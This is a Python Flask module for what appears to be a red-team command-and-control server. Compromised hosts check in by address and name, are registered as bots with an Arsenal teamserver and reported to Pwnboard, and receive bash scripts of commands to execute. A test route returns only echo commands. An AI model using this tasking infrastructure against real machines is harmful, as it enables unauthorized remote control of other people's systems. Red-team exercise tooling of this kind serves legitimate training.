"""
    This module contains all valid server endpoints.
"""
from flask import Blueprint, Response
from .handlers import (new_agent, existing_agent, parse_actions,
    DEFAULT_COMMANDS, get_file_commands)
from .utils import log, is_session, slackError, updatePwnboard
from .client import ArsenalClient
from .config import API_KEY_FILE, TEAMSERVER_URI
ROUTES = Blueprint('endpoint', __name__)

try:
    CLIENT = ArsenalClient(teamserver_uri=TEAMSERVER_URI, api_key_file=API_KEY_FILE)
except Exception as E:
    CLIENT = None
    print("Arsenal Error {}".format(E))
    slackError("Arsenal Client {}".format(E))

@ROUTES.route('/<addr>/<name>', methods=['POST', 'GET'])
def handle_agent(addr="U", name="Name"):
    """
    This method handles any incoming agent connections.
    """
    def render_commands(commands, session_id=None):
        '''
        Turn an array of commands into a bash file
        '''
        if commands:
            newcom = ["#!/bin/bash"]
            # If we are given a session ID, show it to the client
            if session_id:
                newcom += ["# {}".format(session_id)]
            commands = newcom + commands
            commands = "\n".join(commands)
            return commands + "\n"
        if session_id:
            return "# {}\n".format(session_id)
        return ""
    updatePwnboard(addr)
    commands = []
    # Try to get the session ID
    session_id = is_session(addr, name)
    # If our session ID doesnt exists, then we create another one
    newBot = False
    if session_id == "":
        # Return the default commands to the host
        if CLIENT:
            newBot = True
            session_id = new_agent(CLIENT, addr, name)
    # Log the function
    log("Checking in {}".format(session_id))
    # Get commands from the server
    if CLIENT:
        commands = existing_agent(CLIENT, session_id)
    # If it is a newbot, and we are  not issued commands
    # Return the default commands
    if newBot:
        commands = DEFAULT_COMMANDS

    final_script = render_commands(commands, session_id)
    final_script += get_file_commands(addr, name)

    return Response(final_script, mimetype="text/plain")


@ROUTES.route('/test', methods=['GET', 'POST'])
def test_response():
    """
    This function will return a sample of a standard response using static data.
    """
    def render_commands(commands):
        '''
        Turn array of coms into a bash command
        '''
        commands = ["#!/bin/bash"] + commands
        commands = "\n".join(commands)
        return Response(commands + "\n", mimetype='text/plain')

    actions = [
        {
            "action_id": "some action 1 to track",
            "command": "echo",
            "args": ["this is action 1"],
            "action_type": 1
        },
        {
            "action_id": "some action 2 to track",
            "command": "echo",
            "args": ["action2", "arg2"],
            "action_type": 1
        },
        {
            "action_id": "some action 3 to track",
            "command": "echo",
            "args": ["hi dad"],
            "action_type": 1
        }]
    resp = render_commands(parse_actions(actions))
    return resp
